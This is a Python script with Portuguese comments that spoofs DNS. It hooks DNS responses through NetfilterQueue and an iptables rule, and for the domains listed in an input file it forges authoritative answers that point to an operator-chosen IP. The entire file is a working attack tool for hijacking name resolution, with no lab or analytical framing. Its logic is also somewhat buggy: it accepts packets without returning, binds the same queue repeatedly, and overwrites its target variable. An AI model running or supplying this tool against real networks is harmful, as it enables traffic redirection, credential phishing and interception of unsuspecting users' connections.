# coding: utf-8

from scapy.all import *
from netfilterqueue import NetfilterQueue
from multiprocessing import Process
import argparse

# DNSQR = DNS Question Record
# FQDN = Fully Qualified Domain Name

# sudo iptables -A INPUT -p udp  --sport 53 -j NFQUEUE --queue-num 1
# sudo iptables -L -nv

def redirectDns(packet):
    payload = IP(packet.get_payload())

    if not payload.haslayer(DNSQR):
        # Não é uma consulta dns, aceitar e continuar
        packet.accept()

    if not fqdnToRedirect in payload[DNS].qd.qname:
        # É uma consulta dns mas não para o destino estabelecido, aceitar e continuar
        packet.accept()
    else:
        # consulta dns para o destino estabelecido, necessário redirecionar

        print("DNS interceptado para {}: {}".format(
            fqdnToRedirect, payload.summary()))

        # Constrói a resposta falsificada utilizando o payload original
        redirectedPayload = IP(dst=payload[IP].dst, src=payload[IP].src) / \
                            UDP(dport=payload[UDP].dport, sport=payload[UDP].sport) / \
                            DNS(id=payload[DNS].id, qr=1, aa=1, qd=payload[DNS].qd,
                                an=DNSRR(rrname=payload[DNS].qd.qname, ttl=10, rdata=redirectToIP))

        print("Redirecionando DNS response para: {}".format(redirectedPayload.summary()))
        packet.set_payload(str(redirectedPayload))
        packet.accept()
        print("------------------------------------------")


parser = argparse.ArgumentParser()

parser.add_argument('-q', required=True,
                    metavar='Netfilter Queue ID')

parser.add_argument('-f', required=True,
                    type=argparse.FileType('r'),
                    metavar='fqdn para redirecionar/ip_address')

args = parser.parse_args()

queueId = int(args.q)

with args.f as file:
    lines = file.readlines()

nfqueues = {}

try:
    # Percorre todas as linhas do arquivo
    for line in lines:
        # Separa a URL original e a de redirecionamento
        fqdnToRedirect, redirectToIP = line.replace('\n', '').split('/')

        nfqueue = NetfilterQueue()
        nfqueue.bind(queueId, redirectDns)

        print("Interceptando NFQUEUE: {}".format(str(queueId)))
        print("Redirecionando {} para {}".format(fqdnToRedirect, redirectToIP))
        print("------------------------------------------")

        # Inicia a interceptação em uma thread separada para não travar a aplicação
        nfqueues[fqdnToRedirect] = Process(target=nfqueue.run)
        nfqueues[fqdnToRedirect].start()
except KeyboardInterrupt:
    pass